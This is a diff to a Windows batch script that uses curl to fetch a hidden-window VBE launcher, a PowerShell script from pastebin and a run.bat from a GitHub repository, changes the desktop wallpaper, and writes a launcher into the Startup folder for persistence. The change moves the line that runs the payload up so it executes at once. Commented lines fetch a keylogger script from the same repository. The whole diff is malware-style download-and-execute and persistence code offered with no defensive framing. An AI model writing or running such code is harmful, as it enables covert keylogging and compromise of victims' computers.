@@ -13,6 +13,7 @@ curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invis
 curl -s https://pastebin.com/raw/dsLQmyew -o s.ps1
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%\t\background.png /f
+wscript.exe "i.vbe" "r.bat"
 
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo @echo off>Windows.cmd
@@ -22,4 +23,3 @@ echo wscript.exe "i.vbe" "r.bat">>Windows.cmd
 :: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
 :: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
 :: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/run.bat -o r.bat
-wscript.exe "i.vbe" "r.bat"
